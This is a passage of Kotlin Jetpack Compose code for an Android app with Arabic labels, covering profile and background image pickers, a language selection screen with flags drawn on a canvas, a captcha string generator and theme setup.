        ) {
            Icon(icon, contentDescription = null, tint = Neon.Cyan, modifier = Modifier.size(17.dp))
            Spacer(Modifier.width(6.dp))
            Text(text, color = Neon.Txt, fontSize = 12.5.sp, fontWeight = FontWeight.Bold)
        }
    }

    @Composable
    fun ProfileImageCard() {
        val ctx = LocalContext.current
        val bmp = remember(profileUri, profileBmp) { profileBmp ?: profileUri?.let { uriToBitmap(ctx, it) } }

        Column(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(20.dp))
                .background(Neon.FieldBg)
                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(20.dp))
                .padding(16.dp)
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(64.dp)
                        .clip(CircleShape)
                        .background(Color(0xFF131B45))
                        .border(2.dp, Brush.linearGradient(listOf(Neon.Cyan, Neon.Magenta)), CircleShape),
                    contentAlignment = Alignment.Center
                ) {
                    if (bmp != null) {
                        Image(bitmap = bmp.asImageBitmap(), contentDescription = "صورة الملف الشخصي",
                            modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
                    } else {
                        Icon(Icons.Default.Person, contentDescription = null,
                            tint = Neon.Hint, modifier = Modifier.size(30.dp))
                    }
                }
                Spacer(Modifier.width(14.dp))
                Column {
                    Text("صورة الملف الشخصي", color = Neon.Txt, fontSize = 14.5.sp, fontWeight = FontWeight.Bold)
                    Spacer(Modifier.height(4.dp))
                    Text("اختر صورة أو التقط صورة جديدة", color = Neon.Hint, fontSize = 11.5.sp)
                }
            }
            Spacer(Modifier.height(14.dp))
            Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                PickerButton("اختيار من المعرض", Icons.Default.Image) {
                    requestMediaPermissionThen { pickProfile.launch("image/*") }
                }
                PickerButton("التقاط صورة", Icons.Default.PhotoCamera) { shotProfile.launch(null) }
            }
        }
    }

    @Composable
    fun BackgroundImageCard() {
        val ctx = LocalContext.current
        val bmp = remember(bgUri, bgBmp) { bgBmp ?: bgUri?.let { uriToBitmap(ctx, it) } }

        Column(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(20.dp))
                .background(Neon.FieldBg)
                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(20.dp))
                .padding(16.dp)
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box {
                    Box(
                        modifier = Modifier
                            .width(78.dp)
                            .height(64.dp)
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0xFF131B45))
                            .border(1.dp, Neon.FieldBorder, RoundedCornerShape(12.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        if (bmp != null) {
                            Image(bitmap = bmp.asImageBitmap(), contentDescription = "صورة الخلفية",
                                modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
                        } else {
                            Icon(Icons.Default.Image, contentDescription = null,
                                tint = Neon.Hint, modifier = Modifier.size(26.dp))
                        }
                    }
                    if (bmp != null) {
                        Box(
                            modifier = Modifier
                                .align(Alignment.TopStart)
                                .offset(x = (-6).dp, y = (-6).dp)
                                .size(20.dp)
                                .clip(CircleShape)
                                .background(Neon.Magenta)
                                .clickable { bgUri = null; bgBmp = null },
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(Icons.Default.Close, contentDescription = "حذف الصورة",
                                tint = Color.White, modifier = Modifier.size(13.dp))
                        }
                    }
                }
                Spacer(Modifier.width(14.dp))
                Column {
                    Text("صورة الخلفية", color = Neon.Txt, fontSize = 14.5.sp, fontWeight = FontWeight.Bold)
                    Spacer(Modifier.height(4.dp))
                    Text("اختر صورة خلفية لحسابك", color = Neon.Hint, fontSize = 11.5.sp)
                }
            }
            Spacer(Modifier.height(14.dp))
            Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                PickerButton("اختيار من المعرض", Icons.Default.Image) {
                    requestMediaPermissionThen { pickBg.launch("image/*") }
                }
                PickerButton("التقاط صورة", Icons.Default.PhotoCamera) { shotBg.launch(null) }
            }
        }
    }

    @Composable
    fun BackButton(onClick: () -> Unit) {
        Box(
            modifier = Modifier
                .size(40.dp)
                .clip(RoundedCornerShape(12.dp))
                .background(Color(0x40131B45))
                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(12.dp))
                .clickable { onClick() },
            contentAlignment = Alignment.Center
        ) {
            Text("→", color = Neon.Cyan, fontSize = 18.sp, fontWeight = FontWeight.Bold)
        }
    }

    @Composable
    fun LanguageScreen() {
        val languages = listOf(
            LangItem("English", "us"),
            LangItem("中文简体", "cn"),
            LangItem("中文繁体", "cn"),
            LangItem("日本語", "jp"),
            LangItem("Türkçe", "tr"),
            LangItem("한국인", "kr"),
            LangItem("Vietnam", "vn"),
            LangItem("French", "fr"),
            LangItem("Portuguese", "pt"),
            LangItem("اردو", "pk"),
            LangItem("چینی (ساده شده)", "ir"),
            LangItem("ภาษาจีน(ตัวย่อ)", "th")
        )

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(horizontal = 20.dp)
        ) {
            Spacer(Modifier.height(40.dp))
            Column(modifier = Modifier.fillMaxWidth(), horizontalAlignment = Alignment.End) {
                Text("اختر اللغة", color = Neon.Txt, fontSize = 22.sp,
                    fontWeight = FontWeight.Bold, textAlign = TextAlign.Right,
                    modifier = Modifier.fillMaxWidth())
                Spacer(Modifier.height(6.dp))
                Text("Select your language", color = Neon.Hint, fontSize = 13.sp,
                    textAlign = TextAlign.Right, modifier = Modifier.fillMaxWidth())
            }
            Spacer(Modifier.height(24.dp))

            Column(modifier = Modifier.weight(1f).verticalScroll(rememberScrollState())) {
                languages.forEachIndexed { index, item ->
                    val selected = selectedLang == index
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(if (selected) Color(0xFF161F33) else Color.Transparent)
                            .clickable { selectedLang = index }
                            .padding(horizontal = 12.dp, vertical = 14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(item.name, color = Neon.Txt, fontSize = 15.sp, modifier = Modifier.weight(1f))
                        Spacer(Modifier.width(14.dp))
                        FlagIcon(code = item.flag, modifier = Modifier.width(32.dp).height(23.dp))
                        Spacer(Modifier.width(14.dp))
                        if (selected) {
                            Box(modifier = Modifier.size(26.dp).clip(CircleShape).background(Neon.Purple),
                                contentAlignment = Alignment.Center) {
                                Text("✓", color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.Bold)
                            }
                        } else {
                            Box(modifier = Modifier.size(26.dp).border(2.dp, Color(0xFF7D8798), CircleShape))
                        }
                    }
                }
            }

            Spacer(Modifier.height(12.dp))

            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(56.dp)
                    .shadow(18.dp, RoundedCornerShape(16.dp), ambientColor = Neon.Magenta, spotColor = Neon.Purple)
                    .clip(RoundedCornerShape(16.dp))
                    .background(Brush.horizontalGradient(listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
                    .clickable {
                        currentScreen = 0
                    },
                contentAlignment = Alignment.Center
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("متابعة", color = Color.White, fontSize = 17.sp, fontWeight = FontWeight.Bold)
                    Spacer(Modifier.width(8.dp))
                    Text("←", color = Color.White, fontSize = 20.sp, fontWeight = FontWeight.Bold)
                }
            }
            Spacer(Modifier.height(24.dp))
        }
    }

    @Composable
    fun FlagIcon(code: String, modifier: Modifier = Modifier) {
        ComposeCanvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
            val w = size.width
            val h = size.height
            when (code) {
                "us" -> {
                    val stripe = h / 13f
                    for (i in 0 until 13) {
                        drawRect(
                            color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
                            topLeft = Offset(0f, i * stripe),
                            size = Size(w, stripe + 1f)
                        )
                    }
                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero, size = Size(w * 0.45f, stripe * 7f))
                    val dotR = stripe * 0.3f
                    for (row in 0 until 4) {
                        for (col in 0 until 5) {
                            drawCircle(Color.White, radius = dotR,
                                center = Offset(w * 0.45f * (col + 0.5f) / 5f, stripe * 7f * (row + 0.5f) / 4f))
                        }
                    }
                }
                "cn" -> {
                    drawRect(Color(0xFFDE2910))
                    drawPath(starPath(w * 0.22f, h * 0.32f, h * 0.22f), Color(0xFFFFDE00))
                }
                "jp" -> {
                    drawRect(Color.White)
                    drawCircle(Color(0xFFBC002D), radius = h * 0.3f, center = Offset(w / 2f, h / 2f))
                }
                "tr" -> {
                    drawRect(Color(0xFFE30A17))
                    drawCircle(Color.White, radius = h * 0.3f, center = Offset(w * 0.38f, h / 2f))
                    drawCircle(Color(0xFFE30A17), radius = h * 0.25f, center = Offset(w * 0.44f, h / 2f))
                    drawPath(starPath(w * 0.6f, h / 2f, h * 0.13f, startDeg = 180), Color.White)
                }
                "kr" -> {
                    drawRect(Color.White)
                    val d = h * 0.56f
                    val tl = Offset(w / 2f - d / 2f, h / 2f - d / 2f)
                    drawArc(Color(0xFFCD2E3A), 180f, 180f, true, tl, Size(d, d))
                    drawArc(Color(0xFF0047A0), 0f, 180f, true, tl, Size(d, d))
                }
                "vn" -> {
                    drawRect(Color(0xFFDA251D))
                    drawPath(starPath(w / 2f, h / 2f, h * 0.28f), Color(0xFFFFFF00))
                }
                "fr" -> {
                    drawRect(Color(0xFF0055A4), size = Size(w / 3f, h))
                    drawRect(Color.White, topLeft = Offset(w / 3f, 0f), size = Size(w / 3f, h))
                    drawRect(Color(0xFFEF4135), topLeft = Offset(2f * w / 3f, 0f), size = Size(w / 3f, h))
                }
                "pt" -> {
                    drawRect(Color(0xFF046A38), size = Size(w * 0.4f, h))
                    drawRect(Color(0xFFDA291C), topLeft = Offset(w * 0.4f, 0f), size = Size(w * 0.6f, h))
                    drawCircle(Color(0xFFFFE900), radius = h * 0.16f, center = Offset(w * 0.4f, h / 2f))
                }
                "pk" -> {
                    drawRect(Color(0xFF01411C))
                    drawRect(Color.White, size = Size(w * 0.25f, h))
                    drawCircle(Color.White, radius = h * 0.28f, center = Offset(w * 0.62f, h * 0.45f))
                    drawCircle(Color(0xFF01411C), radius = h * 0.24f, center = Offset(w * 0.68f, h * 0.4f))
                }
                "ir" -> {
                    drawRect(Color(0xFF239F40), size = Size(w, h / 3f))
                    drawRect(Color.White, topLeft = Offset(0f, h / 3f), size = Size(w, h / 3f))
                    drawRect(Color(0xFFDA0000), topLeft = Offset(0f, 2f * h / 3f), size = Size(w, h / 3f))
                }
                "th" -> {
                    val s = h / 6f
                    drawRect(Color(0xFFA51931), size = Size(w, s))
                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s), size = Size(w, s))
                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f * s), size = Size(w, 2f * s))
                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f * s), size = Size(w, s))
                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f * s), size = Size(w, s))
                }
                else -> drawRect(Color(0xFF555555))
            }
        }
    }

    private fun starPath(cx: Float, cy: Float, outerR: Float, startDeg: Int = -90): Path {
        val innerR = outerR * 0.382f
        val path = Path()
        for (i in 0 until 10) {
            val angle = Math.toRadians((startDeg + i * 36).toDouble())
            val r = if (i % 2 == 0) outerR else innerR
            val x = cx + (r * Math.cos(angle)).toFloat()
            val y = cy + (r * Math.sin(angle)).toFloat()
            if (i == 0) path.moveTo(x, y) else path.lineTo(x, y)
        }
        path.close()
        return path
    }

    private fun generateCaptcha(): String {
        val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return (1..4).map { chars[Random.nextInt(chars.length)] }.joinToString("")
    }

    private fun showToast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }
}

fun loadAssetBitmap(context: Context, path: String): Bitmap? = try {
    context.assets.open(path).use { BitmapFactory.decodeStream(it) }
} catch (_: Exception) { null }

fun uriToBitmap(ctx: Context, uri: Uri): Bitmap? = try {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        val src = ImageDecoder.createSource(ctx.contentResolver, uri)
        ImageDecoder.decodeBitmap(src) { decoder, _, _ ->
            decoder.allocator = ImageDecoder.ALLOCATOR_SOFTWARE
            decoder.isMutableRequired = false
        }
    } else {
        @Suppress("DEPRECATION")
        MediaStore.Images.Media.getBitmap(ctx.contentResolver, uri)
    }
} catch (_: Exception) { null }

@Composable
fun AppTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Neon.Blue,
            background = Neon.DeepBottom,
            surface = Neon.FieldBg,
            onPrimary = Color.White,
            onBackground = Color.White,
            onSurface = Color.White
        )
    ) {
        content()
    }
}
